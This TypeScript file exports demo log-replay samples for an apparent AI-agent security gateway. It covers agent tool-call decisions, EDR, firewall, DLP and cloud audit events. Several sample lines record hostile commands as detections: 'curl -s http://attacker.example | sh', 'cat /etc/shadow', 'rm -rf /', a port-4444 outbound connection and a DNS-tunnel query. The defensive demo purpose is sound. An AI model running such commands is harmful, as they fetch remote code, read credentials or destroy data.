/* ------------------------------------------------------------------ */
/* Raw log replay samples                                              */
/* ------------------------------------------------------------------ */

/** Raw replay buffer per log source, used by the replay panel. */
export const demoReplaySamples: Record<string, string[]> = {
  'src-gateway-mirror': [
    '{"ts":"2025-03-18T09:29:55.101Z","tenant":"acme","agent":"营销文案生成 Agent","mcp":"web-search-mcp","tool":"fetch_url","action":"deny","reason":"egress target outside allow-list","host":"attacker.example"}',
    '{"ts":"2025-03-18T09:29:56.480Z","tenant":"acme","agent":"客服智能助手 Copilot","mcp":"order-mcp","tool":"get_order","action":"allow","latency_ms":112}',
    '{"ts":"2025-03-18T09:29:57.204Z","tenant":"acme","agent":"数据清洗 ETL Agent","mcp":"postgres-mcp","tool":"execute_query","action":"mask","fields":["phone","idcard"]}',
    '{"ts":"2025-03-18T09:29:58.412Z","tenant":"acme","agent":"运维告警分析 Agent","mcp":"shell-mcp","tool":"run_command","action":"quarantine","reason":"dangerous tool requires approval"}',
  ],
  'src-mcp-proxy': [
    'span=tools/call service=mcp-proxy tool=execute_query decision=mask agent=数据清洗 ETL Agent duration=142ms',
    'span=tools/call service=mcp-proxy tool=write_file decision=quarantine agent=运维告警分析 Agent duration=88ms',
    'span=tools/call service=mcp-proxy tool=get_order decision=allow agent=客服智能助手 Copilot duration=64ms',
  ],
  'src-agent-stdout': [
    '2025-03-18 09:29:58,412 INFO  [agent=copilot session=ses-9f2c8a41] tool_call tool=get_order args={"order_id":"SO20250318001"} elapsed=118ms',
    '2025-03-18 09:29:59,003 WARN  [agent=etl session=ses-77a0c3b5] guardrail hit: response field phone not masked',
    '2025-03-18 09:30:00,118 ERROR [agent=ops-shadow session=ses-1a2b3c4d] command blocked by process-hook: rm -rf /',
  ],
  'src-edr': [
    '{"event_id":"edr-7f3a91","hostname":"ops-analyzer.acme.internal","process":"/bin/bash","command_line":"cat /etc/shadow","severity":"high"}',
    '{"event_id":"edr-88b2c4","hostname":"dev-tools-01.acme.internal","process":"python3","command_line":"curl -s http://attacker.example | sh","severity":"critical"}',
  ],
  'src-fw-syslog': [
    'CEF:0|Acme|Firewall|4.2|1001|Outbound connection blocked|7|src=10.20.31.17 dst=47.98.12.33 dpt=4444 proto=TCP act=block',
    'CEF:0|Acme|Firewall|4.2|1002|DNS tunnel suspected|6|src=10.20.72.9 dst=8.8.8.8 query=ZXhmaWwuYXR0YWNrZXIuZXhhbXBsZQ== act=alert',
  ],
  'src-dlp': ['CEF:0|Acme|DLP|1.2.7|2003|Sensitive data egress|9|fname=orders.csv fsize=214000 dst=attacker.example'],
  'src-cloudtrail': [
    '{"eventTime":"2025-03-18T09:24:00Z","eventName":"ListAgentTeams","userIdentity":{"type":"assumed-role"},"sourceIpAddress":"10.20.5.9"}',
    '{"eventTime":"2025-03-18T09:26:12Z","eventName":"GetSecretValue","userIdentity":{"type":"assumed-role"},"sourceIpAddress":"10.20.5.9","errorCode":"AccessDenied"}',
  ],
  'src-otel-http': [
    '{"name":"agent.turn","attributes":{"agent":"客服智能助手 Copilot","tokens.in":1840,"tokens.out":210,"model":"qwen-max-2025-01-25"}}',
  ],
  'src-fluentd': ['2025-03-18T09:29:57+08:00\tag=agf.gateway\t{"action":"throttle","agent":"客服智能助手 Copilot","reason":"quota 87%"}'],
  'src-nats': ['agf.events.policy {"policy":"pol-egress-deny","hits":412,"window":"24h"}'],
};
